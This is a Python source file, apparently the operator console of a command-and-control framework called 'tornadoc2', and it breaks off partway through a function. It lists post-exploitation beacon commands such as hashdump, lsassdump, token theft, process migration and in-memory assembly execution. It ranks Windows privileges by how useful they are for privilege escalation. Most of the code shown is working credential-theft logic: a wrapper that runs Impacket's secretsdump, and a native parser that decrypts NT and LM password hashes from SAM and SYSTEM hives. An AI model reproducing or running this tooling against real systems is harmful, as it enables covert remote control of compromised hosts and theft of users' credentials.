"""Interactive operator REPL.

Every keystroke becomes a POST to the team server. The server is
the source of truth; the client has no local state beyond the
connection.

Features:
  * Colored output on a TTY, plain otherwise.
  * Readline history, persisted to ~/.tornadoc2_history.
  * Tab completion for meta commands, beacon IDs, verbs, audit subs.
  * Ctrl-C at the prompt clears the line instead of exiting.
  * Table-style beacon listing.
  * Live status line while a task is polling.
  * Remote build wizard and config-file submission. The wizard
    prompts for a server-side pivot keypair path when the build
    selects SMB or TCP.
"""

from __future__ import annotations

import argparse
import base64 as _b64
import hashlib
import json
import os
import random
import shutil
import struct
import subprocess
import sys
import threading
import time

try:
    import readline
except ImportError:
    try:
        import pyreadline3 as readline
    except ImportError:
        readline = None

from . import config as cfg_mod
from .transport import Transport


# ---------------------------------------------------------------------
# Colors

_COLOR = sys.stdout.isatty()


def _ansi(code: str) -> str:
    return code if _COLOR else ''


CLR = {
    'reset':   _ansi('\033[0m'),
    'bold':    _ansi('\033[1m'),
    'dim':     _ansi('\033[2m'),
    'red':     _ansi('\033[91m'),
    'green':   _ansi('\033[92m'),
    'yellow':  _ansi('\033[93m'),
    'blue':    _ansi('\033[94m'),
    'magenta': _ansi('\033[95m'),
    'cyan':    _ansi('\033[96m'),
}

_UNICODE = _COLOR


def _hr(width=72, char=None):
    if char is None:
        char = '─' if _UNICODE else '-'
    print(f"{CLR['dim']}{char * width}{CLR['reset']}")


def _header(label):
    width = 72
    prefix = '── ' if _UNICODE else '-- '
    dashes = max(0, width - len(prefix) - len(label) - 1)
    fill = ('─' if _UNICODE else '-') * dashes
    print(f"{CLR['cyan']}{CLR['bold']}{prefix}{label} {fill}"
          f"{CLR['reset']}")


def _print_wrapped(text, indent='  '):
    for line in text.splitlines():
        print(indent + line)


def _human_bytes(n: int) -> str:
    """Render a byte count as a compact human-readable string."""
    for unit in ('B', 'K', 'M', 'G'):
        if n < 1024:
            if unit == 'B':
                return f"{n}B"
            return f"{n:.1f}{unit}"
        n /= 1024
    return f"{n:.1f}T"


# ---------------------------------------------------------------------
# Fallback completion data
#
# The command catalogue is fetched from the server at banner time and
# filtered by the operator's role. These constants are only used when
# the server does not respond to /api/v1/commands — an older team
# server, or a network failure during startup. The client prints a
# warning when it falls back.

FALLBACK_META = [
    'help', 'beacons', 'bl', 'use', 'detach', 'info', 'caps',
    'audit', 'chat', 'history', 'jobs', 'clear', 'exit', 'quit',
    'build', 'c2-profiles', 'c2p', 'bofs', 'creds', 'notes',
    'webhooks', 'operators', 'op', 'killall', 'recipes',
    'deadman', 'halt', 'loot', 'lootstore',
]

FALLBACK_BEACON = [
    'ls', 'cat', 'readfile', 'find', 'grep', 'head', 'tail',
    'stat', 'strings', 'hexdump',
    'sha1', 'sha256', 'md5', 'cksum',
    'readlink', 'realpath', 'du',
    'wc', 'nl', 'rev', 'sort', 'uniq', 'tr', 'base64',
    'which', 'ifconfig',
    'netstat', 'arp', 'route',
    'users', 'groups',
    'av-list',
    'ps', 'id', 'env', 'pwd', 'whoami', 'hostname', 'uname',
    'df', 'uptime', 'date', 'getpid', 'getppid',
    'screenshot',
    'mkdir', 'rm', 'cp', 'mv', 'chmod', 'ln', 'touch',
    'gzip', 'gunzip',
    'curl', 'resolve', 'nc',
    'exec', 'sh', 'upload', 'download',
    'pyexec', 'psexec', 'shexec',
    'execmem', 'bof', 'execute-assembly',
    'extension',
    'sleep', 'workhours', 'spawnto', 'kill', 'exit',
    'export', 'socks',
    'info', 'graph', 'forget', 'detach',
    'tasks', 'wait', 'schedule',
    'steal_token', 'migrate',
    'hashdump', 'lsassdump',
    'enablepriv',
    'make_token', 'runas', 'rev2self',
]

FALLBACK_EXTENSION_SUBS = [
    'list', 'info', 'load', 'list-loaded', 'call', 'unload',
]

FALLBACK_NATIVE = frozenset({
    'ls', 'cat', 'readfile', 'find', 'grep', 'head', 'tail',
    'stat', 'strings', 'hexdump',
    'sha1', 'sha256', 'md5', 'cksum',
    'readlink', 'realpath', 'du',
    'wc', 'nl', 'rev', 'sort', 'uniq', 'tr', 'base64',
    'which', 'ifconfig',
    'netstat', 'arp', 'route',
    'users', 'groups',
    'av-list',
    'ps', 'id', 'env', 'pwd', 'whoami', 'hostname', 'uname',
    'df', 'uptime', 'date', 'getpid', 'getppid',
    'screenshot',
    'mkdir', 'rm', 'cp', 'mv', 'chmod', 'ln', 'touch',
    'gzip', 'gunzip',
    'curl', 'resolve', 'nc',
    'exec', 'sh', 'execmem', 'bof',
    'sleep', 'workhours', 'spawnto', 'kill', 'exit',
    'migrate',
})

AUDIT_SUBS = ['tail', 'show', 'read', 'verify', 'checkpoint',
              'chat']

HISTORY_FILE = os.path.expanduser('~/.tornadoc2_history')

_CHAT_OUTPUT_LOCK = threading.Lock()

_CHAT_HUES = ('cyan', 'green', 'yellow', 'blue', 'magenta')

_ENABLEPRIV_CATALOGUE = {
    "SeAssignPrimaryTokenPrivilege":
        "Replace a process-level token",
    "SeAuditPrivilege":
        "Generate security audits",
    "SeBackupPrivilege":
        "Back up files and directories",
    "SeChangeNotifyPrivilege":
        "Bypass traverse checking",
    "SeCreateGlobalPrivilege":
        "Create global objects",
    "SeCreatePagefilePrivilege":
        "Create a pagefile",
    "SeCreatePermanentPrivilege":
        "Create permanent shared objects",
    "SeCreateSymbolicLinkPrivilege":
        "Create symbolic links",
    "SeCreateTokenPrivilege":
        "Create a token object",
    "SeDebugPrivilege":
        "Debug programs",
    "SeDelegateSessionUserImpersonatePrivilege":
        "Obtain an impersonation token for another user in the "
        "same session",
    "SeEnableDelegationPrivilege":
        "Enable computer and user accounts to be trusted for "
        "delegation",
    "SeImpersonatePrivilege":
        "Impersonate a client after authentication",
    "SeIncreaseBasePriorityPrivilege":
        "Increase scheduling priority",
    "SeIncreaseQuotaPrivilege":
        "Adjust memory quotas for a process",
    "SeIncreaseWorkingSetPrivilege":
        "Increase a process working set",
    "SeLoadDriverPrivilege":
        "Load and unload device drivers",
    "SeLockMemoryPrivilege":
        "Lock pages in memory",
    "SeMachineAccountPrivilege":
        "Add workstations to domain",
    "SeManageVolumePrivilege":
        "Perform volume maintenance tasks",
    "SeProfileSingleProcessPrivilege":
        "Profile single process",
    "SeRelabelPrivilege":
        "Modify an object label",
    "SeRemoteShutdownPrivilege":
        "Force shutdown from a remote system",
    "SeRestorePrivilege":
        "Restore files and directories",
    "SeSecurityPrivilege":
        "Manage auditing and security log",
    "SeShutdownPrivilege":
        "Shut down the system",
    "SeSyncAgentPrivilege":
        "Synchronize directory service data",
    "SeSystemEnvironmentPrivilege":
        "Modify firmware environment values",
    "SeSystemProfilePrivilege":
        "Profile system performance",
    "SeSystemtimePrivilege":
        "Change the system time",
    "SeTakeOwnershipPrivilege":
        "Take ownership of files or other objects",
    "SeTcbPrivilege":
        "Act as part of the operating system",
    "SeTimeZonePrivilege":
        "Change the time zone",
    "SeTrustedCredManAccessPrivilege":
        "Access Credential Manager as a trusted caller",
    "SeUndockPrivilege":
        "Remove computer from docking station",
}

_ENABLEPRIV_TIERS = {
    "CRITICAL": {
        "SeImpersonatePrivilege":
            "Impersonate a client after authentication — commonly "
            "held by service accounts; a well-known local-privilege-"
            "escalation vector.",
        "SeAssignPrimaryTokenPrivilege":
            "Replace a process-level token — the same class of "
            "exposure as SeImpersonatePrivilege.",
        "SeDebugPrivilege":
            "Open any process with full access, including LSASS; "
            "read and write memory across the system.",
        "SeTcbPrivilege":
            "Act as part of the operating system — full trust on "
            "the host.",
        "SeCreateTokenPrivilege":
            "Create arbitrary token objects with arbitrary group "
            "and privilege membership.",
        "SeLoadDriverPrivilege":
            "Load and unload kernel drivers — code at ring 0.",
    },
    "HIGH": {
        "SeBackupPrivilege":
            "Read any file regardless of ACL, including SAM and "
            "SYSTEM.",
        "SeRestorePrivilege":
            "Write any file regardless of ACL.",
        "SeTakeOwnershipPrivilege":
            "Take ownership of any securable object, then change "
            "its ACL.",
        "SeManageVolumePrivilege":
            "Direct volume access — read and write the raw disk.",
        "SeRelabelPrivilege":
            "Modify the integrity label of any object — bypasses "
            "mandatory integrity controls.",
        "SeSecurityPrivilege":
            "Manage the audit log and security event sources.",
        "SeCreatePermanentPrivilege":
            "Create permanent objects in the object namespace.",
        "SeEnableDelegationPrivilege":
            "Configure Kerberos delegation — domain-wide "
            "impersonation setup.",
    },
    "MEDIUM": {
        "SeCreateSymbolicLinkPrivilege":
            "Create symbolic links — relevant to symlink-based "
            "file redirection in privileged contexts.",
        "SeIncreaseQuotaPrivilege":
            "Adjust memory quotas — tamper with other processes' "
            "resource limits.",
        "SeSystemEnvironmentPrivilege":
            "Modify firmware environment variables — affects "
            "subsequent boot.",
        "SeTrustedCredManAccessPrivilege":
            "Read the Credential Manager store as a trusted caller.",
        "SeMachineAccountPrivilege":
            "Add computers to the domain.",
        "SeSyncAgentPrivilege":
            "Synchronize directory service data (DCs only).",
    },
    "LOW": {
        "SeShutdownPrivilege":         "Shut down the local system.",
        "SeRemoteShutdownPrivilege":   "Force shutdown from a remote system.",
        "SeUndockPrivilege":           "Remove from docking station.",
        "SeTimeZonePrivilege":         "Change the time zone.",
        "SeSystemtimePrivilege":       "Change the system clock.",
        "SeChangeNotifyPrivilege":     "Bypass traverse checking.",
        "SeIncreaseWorkingSetPrivilege": "Increase working set.",
        "SeProfileSingleProcessPrivilege": "Profile a single process.",
        "SeSystemProfilePrivilege":    "Profile system performance.",
        "SeIncreaseBasePriorityPrivilege": "Raise thread priority.",
        "SeLockMemoryPrivilege":       "Lock pages in memory.",
        "SeCreateGlobalPrivilege":     "Create global objects.",
        "SeDelegateSessionUserImpersonatePrivilege":
            "Obtain an impersonation token for another user in the "
            "same session.",
    },
}

def _chat_hue(name: str) -> str:
    """Stable hue name for an operator's display color."""
    if not name:
        return 'cyan'
    h = 0
    for ch in name:
        h = (h * 31 + ord(ch)) & 0xffffffff
    return _CHAT_HUES[h % len(_CHAT_HUES)]

import re as _re
_CHAT_MENTION_RE = _re.compile(r'@([A-Za-z0-9][A-Za-z0-9._-]{0,63})')

def _chat_highlight_mentions(text: str, self_name: str) -> str:
    """Return `text` with @mentions colored. The viewer's own
    name is bolded as well as colored so it stands out."""
    def repl(m):
        n = m.group(1)
        if n == self_name:
            return (f"{CLR['bold']}{CLR['yellow']}@{n}"
                    f"{CLR['reset']}")
        return f"{CLR['yellow']}@{n}{CLR['reset']}"
    return _CHAT_MENTION_RE.sub(repl, text)


def _chat_day_label(ts: float) -> str:
    """TODAY / YESTERDAY / weekday date, for history separators."""
    import datetime as _dt
    d = _dt.date.fromtimestamp(ts)
    today = _dt.date.today()
    if d == today:
        return 'TODAY'
    if d == today - _dt.timedelta(days=1):
        return 'YESTERDAY'
    return d.strftime('%A %d %B %Y').upper()


class _ChatPoller:
    """Long-polls the team server for chat messages in the
    background and renders them through the owning client."""

    def __init__(self, client, max_errors=5):
        self.client = client
        self.max_errors = max_errors
        self._stop = threading.Event()
        self._thread = None
        self._last_id = 0
        self._last_day = None

    def seed_from_history(self, msgs):
        """Advance the cursor past messages the console already
        printed, and record the last day so a live message that
        happens to cross midnight still gets a separator."""
        for m in msgs or []:
            mid = m.get('id', 0)
            if mid > self._last_id:
                self._last_id = mid
            ts = m.get('ts')
            if ts is not None:
                self._last_day = _chat_day_label(ts)

    def start(self):
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._run, name='chat-poller', daemon=True)
        self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=8.0)
            self._thread = None

    def _run(self):
        errors = 0
        while not self._stop.is_set():
            try:
                r = self.client.tp.post(
                    '/api/v1/chat/poll',
                    {'after': self._last_id, 'wait': 5.0},
                    timeout=15.0)
                errors = 0
            except Exception:
                errors += 1
                if errors >= self.max_errors:
                    self.client._chat_render({
                        'operator': 'system',
                        'role':     '',
                        'kind':     'system',
                        'text':     ('chat poll failed repeatedly — '
                                     'type /quit and check the '
                                     'server'),
                        'ts':       time.time(),
                    })
                    return
                if self._stop.wait(2.0):
                    return
                continue

            new_topic = r.get('topic') or {}
            new_text = new_topic.get('text', '')
            if new_text != self.client._chat_last_topic:
                self.client._chat_last_topic = new_text
                if new_text:
                    try:
                        self.client._chat_render_topic(new_topic)
                    except Exception:
                        pass

            for m in (r.get('messages') or []):
                mid = m.get('id', 0)
                if mid > self._last_id:
                    self._last_id = mid
                if m.get('operator') == self.client.name:
                    continue

                ts = m.get('ts')
                if ts is not None:
                    day = _chat_day_label(ts)
                    if day != self._last_day:
                        self._last_day = day
                        self.client._chat_render({
                            'operator': 'system',
                            'role':     '',
                            'kind':     'day',
                            'text':     day,
                            'ts':       ts,
                        })
                try:
                    self.client._chat_render(m)
                except Exception:
                    pass


class _ResultPoller:
    """Background poller for outstanding beacon task results.

    Dispatched tasks are registered here. The poller long-polls
    each one and renders the result when the beacon returns it.
    The main thread never blocks on a task — the operator can
    keep typing while tasks are in flight.

    Multi-step verbs (upload, download, execute-assembly, bof,
    creds validate) do NOT use this class; they call
    _send_and_wait directly and need synchronous semantics to
    chain their sub-tasks.
    """

    def __init__(self, client):
        self.client = client
        self._lock = threading.Lock()
        # task_id -> (verb, beacon_id, started_ts)
        self._pending = {}
        self._stop = threading.Event()
        self._thread = None

    def register(self, task_id, verb, beacon_id, started):
        with self._lock:
            self._pending[task_id] = (verb, beacon_id, started)
            need_thread = (self._thread is None
                           or not self._thread.is_alive())
        if need_thread:
            self._stop.clear()
            self._thread = threading.Thread(
                target=self._run, name='result-poller',
                daemon=True)
            self._thread.start()

    def stop(self):
        self._stop.set()
        if self._thread is not None:
            self._thread.join(timeout=5.0)
            self._thread = None

    def pending_count(self):
        with self._lock:
            return len(self._pending)

    def _run(self):
        while not self._stop.is_set():
            with self._lock:
                batch = list(self._pending.items())
            if not batch:
                if self._stop.wait(0.5):
                    return
                continue
            for task_id, (verb, bid, started) in batch:
                try:
                    r = self.client.tp.post(
                        f'/api/v1/beacon/{bid}/result/{task_id}',
                        {'wait': 1.0}, timeout=15.0)
                except Exception:
                    continue
                if not r.get('ready'):
                    continue
                with self._lock:
                    self._pending.pop(task_id, None)
                try:
                    self.client._render_task_result(
                        task_id, verb, bid, started,
                        r.get('output'),
                        r.get('error'),
                        r.get('exit_code'))
                except Exception:
                    pass

UPLOAD_CHUNK_SIZE   = 32768
DOWNLOAD_CHUNK_SIZE = 24576
MAX_INLINE_SCRIPT   = 1_000_000

_CLIENT_VALIDATABLE = frozenset((
    'plaintext', 'ntlm', 'lm', 'ticket',
    'cert', 'token', 'bearer', 'ssh_key',
))
_CLIENT_VALIDATION_STATUSES = frozenset((
    'unvalidated', 'valid', 'invalid', 'locked',
    'expired', 'error', 'unsupported',
))


def _pack_args_from_format(args, fmt):
    """Pack N args according to a bof_pack-style format string."""
    if len(args) < len(fmt):
        raise ValueError(
            f"format needs {len(fmt)} args, got {len(args)}")
    out = bytearray()
    for ch, val in zip(fmt, args):
        if ch == 'z':
            body = val.encode('utf-8') + b'\x00'
            out += struct.pack('<I', len(body)) + body
        elif ch == 'Z':
            body = val.encode('utf-16-le') + b'\x00\x00'
            out += struct.pack('<I', len(body)) + body
        elif ch == 'i':
            out += struct.pack('<i', int(val))
        elif ch == 's':
            out += struct.pack('<h', int(val))
        elif ch == 'b':
            raw = _b64.b64decode(val)
            out += struct.pack('<I', len(raw)) + raw
        else:
            raise ValueError(f"unsupported format char: {ch!r}")
    return bytes(out)


# ---------------------------------------------------------------------
# hashdump — secretsdump detection + native SAM/SYSTEM parser

def _rc4(key: bytes, data: bytes) -> bytes:
    """Standard RC4. KSA runs once with the full key; the PRGA state
    is carried across the whole input buffer. That matches the
    Windows SAM usage, where the same keystream encrypts the entire
    block rather than being reset per segment."""
    S = list(range(256))
    j = 0
    klen = len(key)
    if klen == 0:
        return data
    for i in range(256):
        j = (j + S[i] + key[i % klen]) & 0xFF
        S[i], S[j] = S[j], S[i]
    out = bytearray(len(data))
    i = j = 0
    for n, byte in enumerate(data):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out[n] = byte ^ S[(S[i] + S[j]) & 0xFF]
    return bytes(out)


def _find_secretsdump():
    """Locate a secretsdump implementation.

    Tries, in order:

      * impacket-secretsdump   Kali/Debian/PyPI console script
      * secretsdump.py         source checkout, legacy pip
      * impacket_secretsdump   some distro packages
      * secretsdump            occasional symlink

    then falls back to invoking the module through the current
    interpreter:

      * python -m impacket.examples.secretsdump

    Returns the argv prefix as a list, or None if nothing is
    found. The returned list is meant to be extended with the
    command-line arguments (-sam <path> -system <path> LOCAL)."""
    for name in ('impacket-secretsdump', 'secretsdump.py',
                 'impacket_secretsdump', 'secretsdump'):
        path = shutil.which(name)
        if path:
            return [path]

    # Try the module path through a few interpreters. The current
    # one first, then the names most likely to be on PATH.
    candidates = []
    if sys.executable:
        candidates.append(sys.executable)
    candidates.extend(['python3', 'python'])

    for py in candidates:
        try:
            proc = subprocess.run(
                [py, '-c',
                 'import impacket.examples.secretsdump'],
                capture_output=True, timeout=15)
        except (OSError, subprocess.TimeoutExpired,
                FileNotFoundError):
            continue
        if proc.returncode == 0:
            return [py, '-m', 'impacket.examples.secretsdump']
    return None


class _NativeSamParser:
    """Pure-Python SAM + SYSTEM hive parser.

    Reimplements the algorithms that Impacket's secretsdump.py
    applies on the LOCAL path, so `hashdump` still produces
    hashes when impacket is not installed on the operator's
    machine. Supports Windows 7 through Windows 11 / Server
    2022 (SAM revision 2 and 3).

    Registry hive reference:
      - Header: 4096 bytes, magic 'regf'.
      - hbin blocks: 4096 bytes each, magic 'hbin'.
      - Cells: 4-byte size prefix. Negative = allocated.
      - Cell types: nk (key), vk (value), sk (security),
        lf/lh/li/ri (subkey lists).

    The decryption chain:
      1. SYSTEM\\CurrentControlSet\\Control\\Lsa has four values
         (JD, Skew1, GBG, Data). Concatenate their 4-byte hex-
         decoded bodies and apply the well-known permutation to
         get the 16-byte boot key.
      2. SAM\\Domains\\Account\\F holds salt (offset 0x38, 16
         bytes) and encrypted data (offset 0x48, 32 bytes). RC4
         with MD5(class_name + DIGITS + salt + QWERTY) yields
         the hashed boot key material.
      3. Per-user V value carries LM and NT hash blobs at fixed
         offsets. Each is decrypted with a per-RID key derived
         from the hashed boot key, applied twice for
         Win10+-style double-pass RC4."""

    _PERMUTATION = [0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                    0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7]
    _QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00"
    _DIGITS = b"0123456789012345678901234567890123456789\x00"
    _EMPTY_LM = bytes.fromhex('aad3b435b51404eeaad3b435b51404ee')
    _EMPTY_NT = bytes.fromhex('31d6cfe0d16ae931b73c59d7e0c089c0')

    # --- Hive parsing ------------------------------------------------

    @staticmethod
    def _parse_hive(blob: bytes) -> dict:
        """Walk a hive blob and return a dict mapping lower-cased
        key paths to (class_name_bytes, values_dict). Class name
        and value names are decoded from their on-disk encodings.

        values_dict maps a value name to (vtype, raw_bytes)."""
        if len(blob) < 0x1000 or blob[:4] != b'regf':
            raise ValueError('not a registry hive (bad magic)')

        # Collect hbin blocks so we know the total addressable
        # range and can validate cell offsets.
        hbins = []
        off = 0x1000
        while off + 0x20 <= len(blob):
            if blob[off:off + 4] != b'hbin':
                break
            size = struct.unpack_from('<I', blob, off + 0x08)[0]
            if size < 0x20 or off + size > len(blob):
                break
            hbins.append((off, size))
            off += size
        if not hbins:
            raise ValueError('no hbin blocks found')

        first_hbin = hbins[0][0]

        def cell(offset: int) -> bytes:
            """Return the body of the cell at the given hive
            offset, i.e. the bytes after the 4-byte size prefix.
            `offset` is relative to the start of the first hbin
            block, which is what every nk/vk pointer in a hive
            uses."""
            abs_off = first_hbin + offset
            if abs_off + 4 > len(blob):
                raise ValueError(
                    f'cell offset {offset:#x} out of range')
            size = struct.unpack_from('<i', blob, abs_off)[0]
            if size < 0:
                size = -size
            if size < 4 or abs_off + size > len(blob):
                raise ValueError(
                    f'cell at {offset:#x} has bad size {size}')
            return blob[abs_off + 4:abs_off + size]

        def read_name(cdata: bytes) -> str:
            name_len = struct.unpack_from('<H', cdata, 0x48)[0]
            flags = struct.unpack_from('<H', cdata, 0x02)[0]
            raw = cdata[0x4C:0x4C + (
                name_len if (flags & 0x20) else name_len * 2)]
            if flags & 0x20:
                return raw.decode('latin-1', errors='replace')
            return raw.decode('utf-16-le', errors='replace')

        def subkey_offsets(cdata: bytes) -> list:
            """Return the list of subkey cell offsets for a key
            node, following lf/lh/li/ri indirection as needed."""
            list_off = struct.unpack_from('<I', cdata, 0x1C)[0]
            if list_off == 0xFFFFFFFF:
                return []
            try:
                ldata = cell(list_off)
            except ValueError:
                return []
            sig = ldata[:2]
            if sig in (b'lf', b'lh'):
                count = struct.unpack_from('<H', ldata, 2)[0]
                return [
                    struct.unpack_from(
                        '<I', ldata, 4 + i * 8)[0]
                    for i in range(count)
                ]
            if sig == b'li':
                count = struct.unpack_from('<H', ldata, 2)[0]
                return [
                    struct.unpack_from(
                        '<I', ldata, 4 + i * 4)[0]
                    for i in range(count)
                ]
            if sig == b'ri':
                count = struct.unpack_from('<H', ldata, 2)[0]
                out = []
                for i in range(count):
                    sub_off = struct.unpack_from(
                        '<I', ldata, 4 + i * 4)[0]
                    try:
                        sub = cell(sub_off)
                    except ValueError:
                        continue
                    sub_sig = sub[:2]
                    sub_count = struct.unpack_from(
                        '<H', sub, 2)[0]
                    if sub_sig in (b'lf', b'lh'):
                        for j in range(sub_count):
                            out.append(struct.unpack_from(
                                '<I', sub,
                                4 + j * 8)[0])
                    elif sub_sig == b'li':
                        for j in range(sub_count):
                            out.append(struct.unpack_from(
                                '<I', sub,
                                4 + j * 4)[0])
                return out
            return []

        def key_info(cdata: bytes):
            """Return (class_name_bytes, values_dict)."""
            class_len = struct.unpack_from('<H', cdata, 0x4A)[0]
            class_off = struct.unpack_from('<I', cdata, 0x30)[0]
            class_name = b''
            if class_off != 0xFFFFFFFF and class_len:
                try:
                    class_name = cell(class_off)[:class_len]
                except ValueError:
                    class_name = b''

            num_values = struct.unpack_from('<I', cdata, 0x24)[0]
            values_off = struct.unpack_from('<I', cdata, 0x28)[0]
            values = {}
            if num_values and values_off != 0xFFFFFFFF:
                try:
                    vlist = cell(values_off)
                except ValueError:
                    return class_name, values
                for i in range(num_values):
                    if 4 + i * 4 + 4 > len(vlist):
                        break
                    v_off = struct.unpack_from(
                        '<I', vlist, i * 4)[0]
                    try:
                        vcell = cell(v_off)
                    except ValueError:
                        continue
                    if vcell[:2] != b'vk':
                        continue
                    name_len = struct.unpack_from(
                        '<H', vcell, 0x02)[0]
                    data_len = struct.unpack_from(
                        '<I', vcell, 0x04)[0]
                    data_off = struct.unpack_from(
                        '<I', vcell, 0x08)[0]
                    vtype = struct.unpack_from(
                        '<I', vcell, 0x0C)[0]
                    flags = struct.unpack_from(
                        '<H', vcell, 0x10)[0]

                    if name_len == 0:
                        vname = '(default)'
                    elif flags & 0x1:
                        vname = vcell[0x14:0x14 + name_len] \
                            .decode('latin-1', errors='replace')
                    else:
                        vname = vcell[0x14:0x14 + name_len * 2] \
                            .decode('utf-16-le',
                                    errors='replace')

                    if data_len & 0x80000000:
                        # Inline: data is packed into data_off.
                        real_len = data_len & 0x7FFFFFFF
                        raw = struct.pack(
                            '<I', data_off)[:real_len]
                    elif data_off == 0xFFFFFFFF or data_len == 0:
                        raw = b''
                    else:
                        try:
                            raw = cell(data_off)[:data_len]
                        except ValueError:
                            raw = b''
                    values[vname] = (vtype, raw)
            return class_name, values

        root_off = struct.unpack_from('<I', blob, 0x24)[0]

        tree = {}

        def walk(offset: int, path: str):
            try:
                cdata = cell(offset)
            except ValueError:
                return
            if cdata[:2] != b'nk':
                return
            name = read_name(cdata)
            full = f"{path}\\{name}" if path else name
            cls, vals = key_info(cdata)
            tree[full.lower()] = (cls, vals)

            for sub_off in subkey_offsets(cdata):
                walk(sub_off, full)

        walk(root_off, '')
        return tree

    @staticmethod
    def _find(tree, *paths):
        for p in paths:
            hit = tree.get(p.lower())
            if hit is not None:
                return hit
        return None

    # --- Key derivation ----------------------------------------------

    def __init__(self, sam_bytes: bytes, system_bytes: bytes):
        self.sam = self._parse_hive(sam_bytes)
        self.system = self._parse_hive(system_bytes)
        self.boot_key = self._derive_boot_key()
        self.hashed_boot_key = self._derive_hashed_boot_key()

    def _derive_boot_key(self) -> bytes:
        lsa = self._find(
            self.system,
            r'CurrentControlSet\Control\Lsa',
            r'ControlSet001\Control\Lsa',
        )
        if lsa is None:
            raise ValueError(
                'SYSTEM: ControlSet\\Control\\Lsa not found')
        _, vals = lsa
        parts = []
        for name in ('JD', 'Skew1', 'GBG', 'Data'):
            hit = vals.get(name)
            if hit is None:
                raise ValueError(
                    f'SYSTEM: LSA value {name!r} missing')
            _t, raw = hit
            text = raw.decode('utf-16-le',
                              errors='replace').rstrip('\x00')
            try:
                parts.append(bytes.fromhex(text))
            except ValueError as exc:
                raise ValueError(
                    f'SYSTEM: LSA value {name!r} is not hex '
                    f'({text!r})') from exc
        scrambled = b''.join(parts)
        if len(scrambled) != 16:
            raise ValueError(
                f'SYSTEM: boot key material is '
                f'{len(scrambled)} bytes, expected 16')
        return bytes(scrambled[self._PERMUTATION[i]]
                     for i in range(16))

    def _derive_hashed_boot_key(self) -> bytes:
        account = self._find(self.sam, r'SAM\Domains\Account')
        if account is None:
            raise ValueError(
                'SAM: SAM\\Domains\\Account not found')
        cls, vals = account
        f_hit = vals.get('F')
        if f_hit is None:
            raise ValueError(
                'SAM: SAM\\Domains\\Account has no F value')
        _t, F = f_hit
        if len(F) < 0x68:
            raise ValueError(
                f'SAM: F value is only {len(F)} bytes')
        revision = F[0]
        if revision not in (2, 3):
            raise ValueError(
                f'SAM: unsupported revision {revision} '
                f'(Windows XP is not handled)')
        salt = F[0x38:0x38 + 16]
        data = F[0x48:0x48 + 32]

        md5_in = cls + self._DIGITS + salt + self._QWERTY
        sam_key = hashlib.md5(md5_in).digest()
        return _rc4(sam_key, data)

    # --- User enumeration + hash decryption --------------------------

    def _decrypt_hash(self, rid: int, encrypted: bytes,
                      constant: bytes) -> bytes:
        rid_bytes = struct.pack('<I', rid)
        key1 = hashlib.md5(
            rid_bytes + constant +
            self.hashed_boot_key[:16]).digest()
        if len(self.hashed_boot_key) >= 32:
            key2 = hashlib.md5(
                rid_bytes + constant +
                self.hashed_boot_key[16:32]).digest()
        else:
            key2 = key1
        return _rc4(key2, _rc4(key1, encrypted))

    def dump(self):
        """Yield (rid, username, lm_hex, nt_hex) for every user
        that has a V value carrying a hash blob."""
        # RID → username, read from the Names subkey.
        rid_to_name = {}
        prefix = r'sam\domains\account\users\names\\'
        for path, (_cls, vals) in self.sam.items():
            if not path.startswith(prefix):
                continue
            uname = path[len(prefix):]
            if '\\' in uname:
                continue
            dflt = vals.get('(default)')
            if dflt is None:
                continue
            _t, blob = dflt
            if len(blob) >= 4:
                rid_to_name[struct.unpack(
                    '<I', blob[-4:])[0]] = uname

        user_prefix = r'sam\domains\account\users\\'
        for path, (_cls, vals) in self.sam.items():
            if not path.startswith(user_prefix):
                continue
            rid_part = path[len(user_prefix):]
            if '\\' in rid_part:
                continue
            try:
                rid = int(rid_part, 16)
            except ValueError:
                continue
            v_hit = vals.get('V')
            if v_hit is None:
                continue
            _t, V = v_hit
            if len(V) < 0xCC:
                continue
            try:
                nt_off = struct.unpack_from('<I', V, 0x9C)[0]
                nt_len = struct.unpack_from('<I', V, 0xA0)[0]
                lm_off = struct.unpack_from('<I', V, 0xA4)[0]
                lm_len = struct.unpack_from('<I', V, 0xA8)[0]
            except struct.error:
                continue
            nt_hex = ''
            lm_hex = ''
            if nt_len and 0 < nt_off + nt_len <= len(V):
                try:
                    dec = self._decrypt_hash(
                        rid, V[nt_off:nt_off + nt_len],
                        b'NTPASSWORD')
                    nt_hex = dec[:16].hex()
                except Exception:
                    nt_hex = ''
            if lm_len and 0 < lm_off + lm_len <= len(V):
                try:
                    dec = self._decrypt_hash(
                        rid, V[lm_off:lm_off + lm_len],
                        b'LMPASSWORD')
                    lm_hex = dec[:16].hex()
                except Exception:
                    lm_hex = ''
            uname = rid_to_name.get(rid, f'user{rid}')
            yield rid, uname, lm_hex, nt_hex


def _run_secretsdump(sam_path, sys_path):
    """Try every secretsdump form. Returns a list of
    {'user','domain','lm','ntlm'} dicts, or None if no
    secretsdump was found. An empty list means it ran but
    produced nothing usable."""
    argv = _find_secretsdump()
    if argv is None:
        return None

    try:
        proc = subprocess.run(
            argv + ['-sam', sam_path,
                    '-system', sys_path, 'LOCAL'],
            capture_output=True, text=True, timeout=180)
    except subprocess.TimeoutExpired:
        print(f"{CLR['red']}secretsdump timed out{CLR['reset']}")
        return []
    except OSError as exc:
        print(f"{CLR['red']}secretsdump failed to start: "
              f"{exc}{CLR['reset']}")
        return []

    if proc.returncode != 0:
        print(f"{CLR['red']}secretsdump exited "
              f"{proc.returncode}{CLR['reset']}")
        for line in (proc.stderr or '').strip().splitlines():
            print(f"  {CLR['red']}{line}{CLR['reset']}")
        return []

    empty_lm = 'aad3b435b51404eeaad3b435b51404ee'
    empty_nt = '31d6cfe0d16ae931b73c59d7e0c089c0'

    out = []
    for line in proc.stdout.splitlines():
        if not line.strip():
            continue
        if line.lstrip().startswith('[*]'):
            continue

        fields = line.split(':')
        if len(fields) < 4:
            continue

        domain_user, _rid, lm, ntlm = fields[:4]

        if '\\' in domain_user:
            dom, who = domain_user.split('\\', 1)
        else:
            dom, who = '', domain_user

        if not who or ' ' in who:
            continue

        print(f"  {line}")

        has_nt = bool(ntlm) and ntlm != empty_nt
